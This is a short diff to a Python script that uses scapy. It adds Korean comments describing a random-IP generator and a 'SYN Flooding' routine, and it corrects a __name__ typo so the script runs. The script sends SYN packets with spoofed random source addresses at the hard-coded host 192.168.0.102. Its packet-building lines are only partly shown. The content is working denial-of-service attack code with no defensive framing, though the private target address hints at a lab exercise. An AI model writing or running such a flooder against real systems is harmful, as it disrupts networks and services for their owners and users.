@@ -1,6 +1,7 @@
 from scapy.all import *
 from random import shuffle
 
+#0.0.0.0 ~ 255.255.255.255 사이의 IP주소 리턴
 def getRandomIP():
 	ipfactors = [x for x in range(256)]
 	tmpip = []
@@ -11,6 +12,7 @@ def getRandomIP():
 	return randomip
 
 
+#SYN Flooding 수행
 def synAttack(targetip):
 	srcip = getRandomIP()
 	P_IP = IP(src=srcip, dst=targetip)
@@ -23,5 +25,5 @@ def main():
 	targetip = '192.168.0.102'
 	synAttack(targetip)
 	
-if __nmae__ == '__main__':
+if __name__ == '__main__':
 	main()
